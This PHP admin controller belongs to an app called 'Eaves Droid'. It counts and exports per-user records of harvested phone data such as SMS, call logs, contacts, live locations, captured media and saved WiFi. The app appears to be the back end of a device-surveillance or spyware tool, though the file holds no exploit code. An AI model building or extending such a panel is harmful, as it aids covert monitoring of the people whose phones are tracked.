<?php

namespace App\Controllers\admin;

class Reports extends BaseAdminController
{
    public function index(string $tab = 'dashboard')
    {
        $db = $this->getDb();
        $data = ['pag' => 'admin-reports', 'active_tab' => $tab];
        $data['tab_counts'] = [];

        // Dashboard data
        $data['total_users'] = $db->table('users')->where('deleted_at IS NULL')->countAllResults();
        $data['users_with_data'] = $db->table('uploaded_files')->select('token_owner_id')->groupBy('token_owner_id')->countAllResults();
        $data['total_uploads'] = $db->table('uploaded_files')->countAllResults();
        $data['total_storage'] = $db->table('uploaded_files')->selectSum('file_size_bytes')->get()->getRow()->file_size_bytes ?? 0;

        $dataTables = [
            'SMS' => 'tbl_sms', 'Calls' => 'tbl_logs', 'Contacts' => 'tbl_contacts',
            'Apps' => 'tbl_apps', 'Locations' => 'tbl_location', 'Activities' => 'tbl_activity',
            'Files' => 'tbl_device_files', 'Uploads' => 'uploaded_files',
        ];
        $dataTypeCounts = [];
        foreach ($dataTables as $label => $table) {
            $dataTypeCounts[] = ['label' => $label, 'count' => $db->table($table)->countAllResults()];
        }
        $data['data_type_counts'] = $dataTypeCounts;

        // User activity data
        $data['users'] = $db->table('users')
            ->select('users.id, users.username, auth_identities.secret as email')
            ->join('auth_identities', "auth_identities.user_id = users.id AND auth_identities.type = 'email_password'", 'left')
            ->where('users.deleted_at IS NULL')
            ->orderBy('users.username', 'ASC')
            ->get()
            ->getResultArray();

        // Data usage data
        $dataTables2 = [
            'SMS'           => ['table' => 'tbl_sms',           'icon' => 'fa-sms'],
            'Call Logs'     => ['table' => 'tbl_logs',          'icon' => 'fa-phone'],
            'Contacts'      => ['table' => 'tbl_contacts',      'icon' => 'fa-address-book'],
            'Apps'          => ['table' => 'tbl_apps',          'icon' => 'fa-th'],
            'Locations'     => ['table' => 'tbl_location',      'icon' => 'fa-map-marker-alt'],
            'Activities'    => ['table' => 'tbl_activity',      'icon' => 'fa-running'],
            'Files'         => ['table' => 'tbl_device_files',  'icon' => 'fa-file'],
            'Device Context' => ['table' => 'tbl_device_context','icon' => 'fa-cog'],
            'Network'       => ['table' => 'tbl_network_info',  'icon' => 'fa-wifi'],
            'Accounts'      => ['table' => 'tbl_accounts',      'icon' => 'fa-user-circle'],
            'Calendar'      => ['table' => 'tbl_calendar_events','icon' => 'fa-calendar'],
            'App Usage'     => ['table' => 'tbl_app_usage',     'icon' => 'fa-clock'],
            'Notifications' => ['table' => 'tbl_notifications', 'icon' => 'fa-bell'],
            'Bluetooth'     => ['table' => 'tbl_bluetooth',     'icon' => 'fa-bluetooth'],
            'Sensors'       => ['table' => 'tbl_sensor_profile','icon' => 'fa-microchip'],
            'Security'      => ['table' => 'tbl_security_audit','icon' => 'fa-shield-alt'],
            'Media'         => ['table' => 'tbl_captured_media','icon' => 'fa-camera'],
            'SIM'           => ['table' => 'tbl_sim_configs',   'icon' => 'fa-sim-card'],
            'Uploads'       => ['table' => 'uploaded_files',    'icon' => 'fa-upload'],
        ];

        $allUsers = $db->table('users')->select('users.id, users.username')->where('users.deleted_at IS NULL')->get()->getResultArray();
        $userData = [];
        $grandTotal = 0;
        $allTotals = [];
        foreach ($dataTables2 as $label => $info) {
            $allTotals[$label] = 0;
        }
        foreach ($allUsers as $u) {
            $total = 0;
            $categories = [];
            foreach ($dataTables2 as $label => $info) {
                $table = $info['table'];
                $ownerCol = ($table === 'uploaded_files') ? 'token_owner_id' : 'owner_id';
                $count = $db->table($table)->where($ownerCol, $u['id'])->countAllResults();
                $categories[$label] = $count;
                $total += $count;
                $allTotals[$label] += $count;
            }
            if ($total > 0) {
                $userData[] = ['username' => $u['username'], 'total' => $total, 'categories' => $categories];
            }
            $grandTotal += $total;
        }
        usort($userData, fn($a, $b) => $b['total'] - $a['total']);
        $data['data_tables'] = $dataTables2;
        $data['user_data'] = $userData;
        $data['all_totals'] = $allTotals;
        $data['grand_total'] = $grandTotal;

        // Performance data
        $totalQueries = 0;
        $queryTime = 0;
        $tableSizes = [];
        foreach ($db->listTables() as $table) {
            $status = $db->query("SHOW TABLE STATUS LIKE '{$table}'")->getRow();
            $size = ($status->Data_length ?? 0) + ($status->Index_length ?? 0);
            if ($size > 0) {
                $tableSizes[] = ['name' => $table, 'size' => $size, 'rows' => $status->Rows ?? 0];
            }
        }
        usort($tableSizes, fn($a, $b) => $b['size'] - $a['size']);
        $data['table_sizes'] = $tableSizes;
        $data['total_db_size'] = array_sum(array_column($tableSizes, 'size'));
        $data['total_records'] = array_sum(array_column($tableSizes, 'rows'));
        $data['error_rate'] = $db->table('tbl_user_actions')
            ->select("COUNT(*) as total, SUM(CASE WHEN success = 0 THEN 1 ELSE 0 END) as failed")
            ->get()->getRow();
        $data['uploads_by_day'] = $db->table('uploaded_files')
            ->select("DATE(uploaded_at) as date, COUNT(*) as count, AVG(file_size_bytes) as avg_size")
            ->where('uploaded_at >= DATE_SUB(NOW(), INTERVAL 7 DAY)')
            ->groupBy('DATE(uploaded_at)')
            ->get()->getResultArray();
        $data['php_version'] = PHP_VERSION;
        $data['server_software'] = $_SERVER['SERVER_SOFTWARE'] ?? 'N/A';
        $data['memory_limit'] = ini_get('memory_limit');
        $data['max_upload'] = ini_get('upload_max_filesize');
        $data['max_post'] = ini_get('post_max_size');
        $data['max_execution'] = ini_get('max_execution_time');

        // Generate tab data
        $data['table_map'] = $this->getDataTypeMap();
        $data['results'] = null;
        $data['date_from'] = date('Y-m-d', strtotime('-30 days'));
        $data['date_to'] = date('Y-m-d');
        $data['selected_types'] = [];
        $data['selected_user'] = null;
        $data['selected_user_id'] = 'all';
        $data['format'] = 'html';

        $data['report_history'] = $db->table('tbl_admin_reports')
            ->select('tbl_admin_reports.*, users.username as created_by_username')
            ->join('users', 'users.id = tbl_admin_reports.created_by', 'left')
            ->orderBy('tbl_admin_reports.created_at', 'DESC')
            ->limit(50)
            ->get()
            ->getResultArray();

        return $this->renderView('admin/reports/index', $data);
    }

    public function user_activity()
    {
        return $this->index('user-activity');
    }

    public function data_usage()
    {
        return $this->index('data-usage');
    }

    public function performance()
    {
        return $this->index('performance');
    }

    public function generate()
    {
        if ($this->request->getMethod() !== 'POST') {
            return $this->index('generate');
        }

        try {
        $db = $this->getDb();
        $allTypes = $this->getDataTypeMap();

        $dateFrom  = $this->request->getPost('date_from');
        $dateTo    = $this->request->getPost('date_to');
        $dataTypes = $this->request->getPost('data_types') ?? [];
        $userId    = $this->request->getPost('user_id');
        $format    = $this->request->getPost('format') ?? 'html';

        if (empty($dataTypes)) {
            return redirect()->to('admin/reports/generate')->with('error', 'Please select at least one data type to generate a report.');
        }

        $results = [];
        $grandTotal = 0;
        foreach ($dataTypes as $type) {
            if (!isset($allTypes[$type])) continue;
            $info = $allTypes[$type];
            $table = $info['table'];
            $dateCol = $type === 'uploads' ? 'uploaded_at' : 'created_at';
            $query = $db->table($table)
                ->where("{$dateCol} >=", $dateFrom ?: '1970-01-01')
                ->where("{$dateCol} <=", $dateTo ?: date('Y-m-d'));
            if ($userId && $userId !== 'all') {
                $ownerCol = ($table === 'uploaded_files') ? 'token_owner_id' : 'owner_id';
                $query->where($ownerCol, $userId);
            }
            $count = $query->countAllResults();
            $results[] = ['type' => $type, 'label' => $info['label'], 'icon' => $info['icon'], 'count' => $count];
            $grandTotal += $count;
        }

        if (empty($results)) {
            return redirect()->to('admin/reports/generate')->with('error', 'No data types matched your selection. Please check the data types and try again.');
        }

        $selectedUser = null;
        if ($userId && $userId !== 'all') {
            $selectedUser = $db->table('users')->select('users.id, users.username')
                ->where('id', $userId)->where('deleted_at IS NULL')->get()->getRowArray();
        }

        $userScope = $selectedUser ? $selectedUser['username'] : 'All Users';
        $selectedLabels = array_map(fn($t) => $allTypes[$t]['label'] ?? $t, $dataTypes);
        $dataTypesLabels = implode(', ', $selectedLabels);

        // Build HTML report content
        $html = $this->buildReportHtml($results, $grandTotal, $dateFrom, $dateTo, $userScope, $dataTypesLabels);

        // Save to file
        $timestamp = date('Ymd_His');
        $hash = substr(md5($timestamp . json_encode($dataTypes) . $userId), 0, 8);
        $filename = "report_{$timestamp}_{$hash}.html";
        $reportsDir = WRITEPATH . 'reports';
        $filePath = $reportsDir . '/' . $filename;

        if (!is_dir($reportsDir)) {
            mkdir($reportsDir, 0755, true);
        }
        file_put_contents($filePath, $html);
        $fileSize = filesize($filePath);

        // Insert into tbl_admin_reports
        $db->table('tbl_admin_reports')->insert([
            'user_scope'         => $userScope,
            'user_id'            => $userId !== 'all' ? $userId : null,
            'date_from'          => $dateFrom,
            'date_to'            => $dateTo,
            'data_types'         => json_encode($dataTypes),
            'data_types_labels'  => $dataTypesLabels,
            'format'             => $format,
            'record_count'       => $grandTotal,
            'file_path'          => $filename,
            'file_size'          => $fileSize,
            'created_by'         => $this->userId,
            'created_at'         => date('Y-m-d H:i:s'),
        ]);

        // Log the action
        $this->logAdminAction('report_generated', 'low', true, [
            'new_values' => json_encode([
                'user_scope' => $userScope,
                'data_types' => $dataTypesLabels,
                'format'     => $format,
                'records'    => $grandTotal,
                'file'       => $filename,
            ]),
        ]);

        // Notify admins
        helper('email');
        send_admin_notification(
            'Eaves Droid — Report Generated',
            'email/admin/settings_changed', // reuse settings_changed template
            [
                'changes' => [
                    ['key' => 'User', 'old' => '', 'new' => $userScope],
                    ['key' => 'Data Types', 'old' => '', 'new' => $dataTypesLabels],
                    ['key' => 'Format', 'old' => '', 'new' => $format],
                    ['key' => 'Records', 'old' => '', 'new' => number_format($grandTotal)],
                ],
                'securityAction' => 'Report Generated',
                'securityDescription' => 'A new report has been generated.',
                'securityStatus' => 'success',
                'securityInitiatedBy' => $this->userData['username'] ?? 'Admin',
            ]
        );

        return redirect()->to('admin/reports/generate')->with('success',
            "Report generated — User: {$userScope}, Data: {$dataTypesLabels}, Format: {$format}, Records: " . number_format($grandTotal));

        } catch (\Throwable $e) {
            log_message('error', 'Report generation failed: ' . $e->getMessage() . ' in ' . $e->getFile() . ':' . $e->getLine());
            return redirect()->to('admin/reports/generate')->with('error', 'Failed to generate report: ' . $e->getMessage());
        }
    }

    public function viewReport(int $id)
    {
        $db = $this->getDb();
        $report = $db->table('tbl_admin_reports')->where('id', $id)->get()->getRowArray();
        if (!$report) {
            return $this->response->setJSON(['error' => 'Report not found'])->setStatusCode(404);
        }

        $filePath = WRITEPATH . 'reports/' . $report['file_path'];
        if (!file_exists($filePath)) {
            return $this->response->setJSON(['error' => 'Report file not found'])->setStatusCode(404);
        }

        $content = file_get_contents($filePath);

        return $this->response->setJSON([
            'id'            => $report['id'],
            'user_scope'    => $report['user_scope'],
            'data_types'    => $report['data_types_labels'],
            'format'        => $report['format'],
            'record_count'  => $report['record_count'],
            'file_size'     => $report['file_size'],
            'created_at'    => $report['created_at'],
            'html'          => $content,
        ]);
    }

    public function downloadReport(int $id)
    {
        $db = $this->getDb();
        $report = $db->table('tbl_admin_reports')->where('id', $id)->get()->getRowArray();
        if (!$report) {
            return redirect()->back()->with('error', 'Report not found.');
        }

        $filePath = WRITEPATH . 'reports/' . $report['file_path'];
        if (!file_exists($filePath)) {
            return redirect()->back()->with('error', 'Report file not found.');
        }

        return $this->response->download($filePath, null)->setFileName($report['file_path']);
    }

    private function getDataTypeMap(): array
    {
        return [
            'sms'           => ['table' => 'tbl_sms',            'icon' => 'fa-sms',           'label' => 'SMS'],
            'calls'         => ['table' => 'tbl_logs',           'icon' => 'fa-phone',         'label' => 'Call Logs'],
            'contacts'      => ['table' => 'tbl_contacts',       'icon' => 'fa-address-book',  'label' => 'Contacts'],
            'apps'          => ['table' => 'tbl_apps',           'icon' => 'fa-th',            'label' => 'Apps'],
            'locations'     => ['table' => 'tbl_location',       'icon' => 'fa-map-marker-alt','label' => 'Locations'],
            'activities'    => ['table' => 'tbl_activity',       'icon' => 'fa-running',       'label' => 'Activities'],
            'files'         => ['table' => 'tbl_device_files',   'icon' => 'fa-file',          'label' => 'Device Files'],
            'network'       => ['table' => 'tbl_network_info',   'icon' => 'fa-wifi',          'label' => 'Network Info'],
            'device_context'=> ['table' => 'tbl_device_context', 'icon' => 'fa-cog',           'label' => 'Device Context'],
            'notifications' => ['table' => 'tbl_notifications',  'icon' => 'fa-bell',          'label' => 'Notifications'],
            'accounts'      => ['table' => 'tbl_accounts',       'icon' => 'fa-user-circle',   'label' => 'Accounts'],
            'bluetooth'     => ['table' => 'tbl_bluetooth',      'icon' => 'fa-bluetooth',     'label' => 'Bluetooth'],
            'calendar'      => ['table' => 'tbl_calendar_events','icon' => 'fa-calendar',      'label' => 'Calendar'],
            'app_usage'     => ['table' => 'tbl_app_usage',      'icon' => 'fa-clock',         'label' => 'App Usage'],
            'sensors'       => ['table' => 'tbl_sensor_profile', 'icon' => 'fa-microchip',     'label' => 'Sensors'],
            'security'      => ['table' => 'tbl_security_audit', 'icon' => 'fa-shield-alt',    'label' => 'Security Audit'],
            'media'         => ['table' => 'tbl_captured_media', 'icon' => 'fa-camera',        'label' => 'Captured Media'],
            'sim'           => ['table' => 'tbl_sim_configs',    'icon' => 'fa-sim-card',      'label' => 'SIM Configs'],
            'installed_apps'=> ['table' => 'tbl_installed_apps', 'icon' => 'fa-download',      'label' => 'Installed Apps'],
            'device_info'   => ['table' => 'tbl_device_info',    'icon' => 'fa-info-circle',   'label' => 'Device Info'],
            'battery'       => ['table' => 'tbl_battery_stats',  'icon' => 'fa-battery-half',  'label' => 'Battery Stats'],
            'data_usage'    => ['table' => 'tbl_data_usage',     'icon' => 'fa-chart-line',    'label' => 'Data Usage'],
            'wifi'          => ['table' => 'tbl_saved_wifi',     'icon' => 'fa-wifi',          'label' => 'Saved WiFi'],
            'accessibility' => ['table' => 'tbl_accessibility',  'icon' => 'fa-universal-access','label' => 'Accessibility'],
            'input_methods' => ['table' => 'tbl_input_methods',  'icon' => 'fa-keyboard',      'label' => 'Input Methods'],
            'proc_info'     => ['table' => 'tbl_proc_info',      'icon' => 'fa-microchip',     'label' => 'Process Info'],
            'thermal'       => ['table' => 'tbl_thermal',        'icon' => 'fa-temperature-high','label' => 'Thermal'],
            'nfc'           => ['table' => 'tbl_nfc',            'icon' => 'fa-nfc-symbol',    'label' => 'NFC'],
            'display_info'  => ['table' => 'tbl_display_info',   'icon' => 'fa-tv',            'label' => 'Display Info'],
            'cell_towers'   => ['table' => 'tbl_cell_towers',    'icon' => 'fa-signal',        'label' => 'Cell Towers'],
            'live_locations'=> ['table' => 'tbl_live_locations', 'icon' => 'fa-map-pin',       'label' => 'Live Locations'],
            'uploads'       => ['table' => 'uploaded_files',     'icon' => 'fa-upload',        'label' => 'Uploads'],
        ];
    }

    private function buildReportHtml(array $results, int $grandTotal, ?string $dateFrom, ?string $dateTo, string $userScope, string $dataTypesLabels): string
    {
        $rows = '';
        foreach ($results as $r) {
            $pct = $grandTotal > 0 ? round($r['count'] / $grandTotal * 100, 1) : 0;
            $rows .= '<tr><td>' . $r['label'] . '</td><td class="text-center">' . number_format($r['count']) . '</td><td class="text-center">' . $pct . '%</td></tr>';
        }

        $period = ($dateFrom && $dateTo) ? "{$dateFrom} to {$dateTo}" : 'All time';

        return '<!DOCTYPE html><html><head><meta charset="utf-8"><title>Eaves Droid Report</title>'
            . '<style>'
            . 'body{font-family:DejaVu Sans,sans-serif;font-size:12px;color:#333;padding:30px;}'
            . 'h1{font-size:20px;color:#1a56db;border-bottom:2px solid #1a56db;padding-bottom:8px;margin-bottom:4px;}'
            . '.meta{font-size:11px;color:#64748b;margin-bottom:16px;}'
            . 'table{width:100%;border-collapse:collapse;margin-top:12px;}'
            . 'th{background:#1a56db;color:#fff;padding:8px 12px;text-align:left;font-size:11px;}'
            . 'td{padding:8px 12px;border-bottom:1px solid #e2e8f0;}'
            . 'tr:nth-child(even){background:#f8fafc;}'
            . '.total{font-weight:bold;background:#e2e8f0!important;}'
            . '.summary{margin-top:16px;padding:12px;background:#f0f9ff;border-radius:6px;border-left:4px solid #1a56db;}'
            . '.summary strong{color:#1a56db;}'
            . '</style></head><body>'
            . '<h1>Eaves Droid — Data Report</h1>'
            . '<div class="meta">'
            . 'Generated: ' . date('Y-m-d H:i') . ' | '
            . 'User: ' . htmlspecialchars($userScope) . ' | '
            . 'Period: ' . $period . ' | '
            . 'Data Types: ' . htmlspecialchars($dataTypesLabels)
            . '</div>'
            . '<table><thead><tr><th>Data Type</th><th class="text-center">Records</th><th class="text-center">%</th></tr></thead><tbody>'
            . $rows
            . '<tr class="total"><td>Total</td><td class="text-center">' . number_format($grandTotal) . '</td><td class="text-center">100%</td></tr>'
            . '</tbody></table>'
            . '<div class="summary">'
            . '<strong>Summary:</strong> ' . number_format($grandTotal) . ' total records across ' . count($results) . ' data types'
            . ' for ' . htmlspecialchars($userScope) . ' (' . $period . ').'
            . '</div>'
            . '</body></html>';
    }

    public function user_activity_report(string $username)
    {
        $db = $this->getDb();

        $user = $db->table('users')
            ->where('username', $username)
            ->where('deleted_at IS NULL')
            ->get()
            ->getRowArray();

        if (!$user) {
            return redirect()->to('admin/reports/user-activity')->with('error', 'User not found.');
        }

        $userId = $user['id'];

        $dataTables = [
            ['label' => 'SMS',           'table' => 'tbl_sms',           'icon' => 'fa-sms'],
            ['label' => 'Call Logs',     'table' => 'tbl_logs',          'icon' => 'fa-phone'],
            ['label' => 'Contacts',      'table' => 'tbl_contacts',      'icon' => 'fa-address-book'],
            ['label' => 'Apps',          'table' => 'tbl_apps',          'icon' => 'fa-th'],
            ['label' => 'Locations',     'table' => 'tbl_location',      'icon' => 'fa-map-marker-alt'],
            ['label' => 'Activities',    'table' => 'tbl_activity',      'icon' => 'fa-running'],
            ['label' => 'Files',         'table' => 'tbl_device_files',  'icon' => 'fa-file'],
            ['label' => 'Network',       'table' => 'tbl_network_info',  'icon' => 'fa-wifi'],
            ['label' => 'Accounts',      'table' => 'tbl_accounts',      'icon' => 'fa-user-circle'],
            ['label' => 'Calendar',      'table' => 'tbl_calendar_events','icon' => 'fa-calendar'],
            ['label' => 'App Usage',     'table' => 'tbl_app_usage',     'icon' => 'fa-clock'],
            ['label' => 'Notifications',  'table' => 'tbl_notifications', 'icon' => 'fa-bell'],
            ['label' => 'Bluetooth',     'table' => 'tbl_bluetooth',     'icon' => 'fa-bluetooth'],
            ['label' => 'Sensors',       'table' => 'tbl_sensor_profile','icon' => 'fa-microchip'],
            ['label' => 'Security',      'table' => 'tbl_security_audit','icon' => 'fa-shield-alt'],
            ['label' => 'Media',         'table' => 'tbl_captured_media','icon' => 'fa-camera'],
            ['label' => 'SIM',           'table' => 'tbl_sim_configs',   'icon' => 'fa-sim-card'],
            ['label' => 'Uploads',       'table' => 'uploaded_files',    'icon' => 'fa-upload'],
        ];
        $counts = [];
        foreach ($dataTables as $item) {
            $ownerCol = ($item['table'] === 'uploaded_files') ? 'token_owner_id' : 'owner_id';
            $counts[] = [
                'label' => $item['label'],
                'icon'  => $item['icon'],
                'count' => $db->table($item['table'])->where($ownerCol, $userId)->countAllResults(),
            ];
        }

        $loginHistory = $db->table('auth_logins')
            ->where('user_id', $userId)
            ->orderBy('date', 'DESC')
            ->limit(20)
            ->get()
            ->getResultArray();

        $actions = $db->table('tbl_user_actions')
            ->where('user_id', $userId)
            ->orderBy('created_at', 'DESC')
            ->limit(20)
            ->get()
            ->getResultArray();

        $uploadsPerDay = $db->table('uploaded_files')
            ->select("DATE(uploaded_at) as date, COUNT(*) as count")
            ->where('token_owner_id', $userId)
            ->where('uploaded_at >= DATE_SUB(NOW(), INTERVAL 30 DAY)')
            ->groupBy('DATE(uploaded_at)')
            ->get()
            ->getResultArray();

        return $this->renderView('admin/reports/user_activity_report', [
            'pag' => 'admin-reports',
            'report_user' => $user,
            'data_counts' => $counts,
            'login_history' => $loginHistory,
            'actions' => $actions,
            'uploads_per_day' => $uploadsPerDay,
        ]);
    }

    public function export()
    {
        $db = $this->getDb();
        $format = $this->request->getPost('format') ?? 'csv';
        $dateFrom = $this->request->getPost('date_from') ?? '1970-01-01';
        $dateTo = $this->request->getPost('date_to') ?? date('Y-m-d');
        $dataTypes = $this->request->getPost('data_types') ?? [];
        $userId = $this->request->getPost('user_id');

        $tableMap = $this->getDataTypeMap();

        $rows = [];
        $grandTotal = 0;
        $sourceKeys = !empty($dataTypes) ? $dataTypes : array_keys($tableMap);
        foreach ($sourceKeys as $type) {
            if (!isset($tableMap[$type])) continue;
            $info = $tableMap[$type];
            $table = $info['table'];
            $dateCol = $type === 'uploads' ? 'uploaded_at' : 'created_at';
            $query = $db->table($table)
                ->where("{$dateCol} >=", $dateFrom)
                ->where("{$dateCol} <=", $dateTo);
            if ($userId && $userId !== 'all') {
                $ownerCol = ($table === 'uploaded_files') ? 'token_owner_id' : 'owner_id';
                $query->where($ownerCol, $userId);
            }
            $count = $query->countAllResults();
            $rows[] = ['label' => $info['label'], 'type' => $type, 'count' => $count];
            $grandTotal += $count;
        }

        if ($format === 'csv') {
            $csv = "Data Type,Records\n";
            foreach ($rows as $r) {
                $csv .= '"' . $r['label'] . '",' . $r['count'] . "\n";
            }
            $csv .= "Total,{$grandTotal}\n";
            return $this->response
                ->setHeader('Content-Type', 'text/csv')
                ->setHeader('Content-Disposition', 'attachment; filename="report_' . date('Y-m-d') . '.csv"')
                ->setBody($csv);
        }

        if ($format === 'pdf') {
            $html = '<!DOCTYPE html><html><head><meta charset="utf-8">';
            $html .= '<style>body{font-family:DejaVu Sans,sans-serif;font-size:12px;color:#333;}';
            $html .= 'h1{font-size:18px;color:#1a56db;border-bottom:2px solid #1a56db;padding-bottom:8px;}';
            $html .= 'table{width:100%;border-collapse:collapse;margin-top:16px;}';
            $html .= 'th{background:#1a56db;color:#fff;padding:8px 12px;text-align:left;font-size:11px;}';
            $html .= 'td{padding:8px 12px;border-bottom:1px solid #e2e8f0;}';
            $html .= 'tr:nth-child(even){background:#f8fafc;}';
            $html .= '.total{font-weight:bold;background:#e2e8f0!important;}';
            $html .= '.meta{margin-top:8px;font-size:11px;color:#64748b;}</style></head><body>';
            $html .= '<h1>Eaves Droid — Data Report</h1>';
            $html .= '<div class="meta">Period: ' . $dateFrom . ' to ' . $dateTo . '</div>';
            $html .= '<table><thead><tr><th>Data Type</th><th>Records</th></tr></thead><tbody>';
            foreach ($rows as $r) {
                $html .= '<tr><td>' . $r['label'] . '</td><td>' . number_format($r['count']) . '</td></tr>';
            }
            $html .= '<tr class="total"><td>Total</td><td>' . number_format($grandTotal) . '</td></tr>';
            $html .= '</tbody></table></body></html>';

            if (class_exists('\Dompdf\Dompdf')) {
                $dompdf = new \Dompdf\Dompdf();
                $dompdf->loadHtml($html);
                $dompdf->setPaper('A4', 'portrait');
                $dompdf->render();
                return $this->response
                    ->setHeader('Content-Type', 'application/pdf')
                    ->setHeader('Content-Disposition', 'attachment; filename="report_' . date('Y-m-d') . '.pdf"')
                    ->setBody($dompdf->output());
            }

            return $this->response
                ->setHeader('Content-Type', 'text/html')
                ->setHeader('Content-Disposition', 'attachment; filename="report_' . date('Y-m-d') . '.html"')
                ->setBody($html);
        }

        return redirect()->back()->with('error', 'Unsupported export format.');
    }

    public function generateData()
    {
        if ($this->request->getMethod() !== 'post') {
            return redirect()->to('admin/reports/generate');
        }

        $db = $this->getDb();
        $allTypes = $this->getDataTypeMap();

        $dateFrom  = $this->request->getPost('date_from');
        $dateTo    = $this->request->getPost('date_to');
        $dataTypes = $this->request->getPost('data_types') ?? [];
        $userId    = $this->request->getPost('user_id');
        $format    = $this->request->getPost('format') ?? 'csv';

        if (empty($dataTypes)) {
            return redirect()->to('admin/reports/generate')->with('error', 'Please select at least one data type.');
        }

        $tableMap = $this->getDataTypeMap();
        $rows = [];
        $grandTotal = 0;
        $sourceKeys = $dataTypes;

        foreach ($sourceKeys as $type) {
            if (!isset($tableMap[$type])) continue;
            $info = $tableMap[$type];
            $table = $info['table'];
            $dateCol = $type === 'uploads' ? 'uploaded_at' : 'created_at';
            $query = $db->table($table)
                ->where("{$dateCol} >=", $dateFrom ?: '1970-01-01')
                ->where("{$dateCol} <=", $dateTo ?: date('Y-m-d'));
            if ($userId && $userId !== 'all') {
                $ownerCol = ($table === 'uploaded_files') ? 'token_owner_id' : 'owner_id';
                $query->where($ownerCol, $userId);
            }
            $count = $query->countAllResults();
            $rows[] = ['label' => $info['label'], 'type' => $type, 'count' => $count];
            $grandTotal += $count;
        }

        if ($format === 'csv') {
            $csv = "Data Type,Records Count\n";
            foreach ($rows as $r) {
                $csv .= '"' . $r['label'] . '",' . $r['count'] . "\n";
            }
            $csv .= "Total,{$grandTotal}\n";
            return $this->response
                ->setHeader('Content-Type', 'text/csv')
                ->setHeader('Content-Disposition', 'attachment; filename="report_data_' . date('Y-m-d') . '.csv"')
                ->setBody($csv);
        }

        if ($format === 'html') {
            $html = '<!DOCTYPE html><html><head><meta charset="utf-8"><title>Report Data</title>';
            $html .= '<style>body{font-family:DejaVu Sans,sans-serif;font-size:13px;color:#333;margin:24px;}';
            $html .= 'h1{font-size:18px;color:#1a56db;border-bottom:2px solid #1a56db;padding-bottom:8px;}';
            $html .= 'table{width:100%;border-collapse:collapse;margin-top:16px;}';
            $html .= 'th{background:#1a56db;color:#fff;padding:10px 12px;text-align:left;font-size:12px;}';
            $html .= 'td{padding:8px 12px;border-bottom:1px solid #e2e8f0;}';
            $html .= 'tr:nth-child(even){background:#f8fafc;}';
            $html .= '.total{font-weight:bold;background:#e2e8f0!important;}';
            $html .= '.meta{margin-top:8px;font-size:12px;color:#64748b;}</style></head><body>';
            $html .= '<h1>Eaves Droid — Report Data Export</h1>';
            $html .= '<div class="meta">Period: ' . ($dateFrom ?: 'All time') . ' to ' . ($dateTo ?: 'Today') . ' | Format: HTML | Generated: ' . date('Y-m-d H:i:s') . '</div>';
            $html .= '<table><thead><tr><th>Data Type</th><th>Records</th></tr></thead><tbody>';
            foreach ($rows as $r) {
                $html .= '<tr><td>' . $r['label'] . '</td><td>' . number_format($r['count']) . '</td></tr>';
            }
            $html .= '<tr class="total"><td>Total</td><td>' . number_format($grandTotal) . '</td></tr>';
            $html .= '</tbody></table></body></html>';

            return $this->response
                ->setHeader('Content-Type', 'text/html')
                ->setHeader('Content-Disposition', 'attachment; filename="report_data_' . date('Y-m-d') . '.html"')
                ->setBody($html);
        }

        if ($format === 'pdf') {
            $html = '<!DOCTYPE html><html><head><meta charset="utf-8"><title>Report Data PDF</title>';
            $html .= '<style>body{font-family:DejaVu Sans,sans-serif;font-size:12px;color:#333;margin:24px;}';
            $html .= 'h1{font-size:18px;color:#1a56db;border-bottom:2px solid #1a56db;padding-bottom:8px;}';
            $html .= 'table{width:100%;border-collapse:collapse;margin-top:16px;}';
            $html .= 'th{background:#1a56db;color:#fff;padding:8px 12px;text-align:left;font-size:11px;}';
            $html .= 'td{padding:8px 12px;border-bottom:1px solid #e2e8f0;}';
            $html .= 'tr:nth-child(even){background:#f8fafc;}';
            $html .= '.total{font-weight:bold;background:#e2e8f0!important;}</style></head><body>';
            $html .= '<h1>Eaves Droid — Report Data Export</h1>';
            $html .= '<p>Period: ' . ($dateFrom ?: 'All time') . ' to ' . ($dateTo ?: 'Today') . '</p>';
            $html .= '<table><thead><tr><th>Data Type</th><th>Records</th></tr></thead><tbody>';
            foreach ($rows as $r) {
                $html .= '<tr><td>' . $r['label'] . '</td><td>' . number_format($r['count']) . '</td></tr>';
            }
            $html .= '<tr class="total"><td>Total</td><td>' . number_format($grandTotal) . '</td></tr>';
            $html .= '</tbody></table></body></html>';

            if (class_exists('\Dompdf\Dompdf')) {
                $dompdf = new \Dompdf\Dompdf();
                $dompdf->loadHtml($html);
                $dompdf->setPaper('A4', 'landscape');
                $dompdf->render();
                return $this->response
                    ->setHeader('Content-Type', 'application/pdf')
                    ->setHeader('Content-Disposition', 'attachment; filename="report_data_' . date('Y-m-d') . '.pdf"')
                    ->setBody($dompdf->output());
            }

            return $this->response
                ->setHeader('Content-Type', 'text/html')
                ->setHeader('Content-Disposition', 'attachment; filename="report_data_' . date('Y-m-d') . '.html"')
                ->setBody($html);
        }

        return redirect()->to('admin/reports/generate')->with('error', 'Unsupported export format.');
    }
}
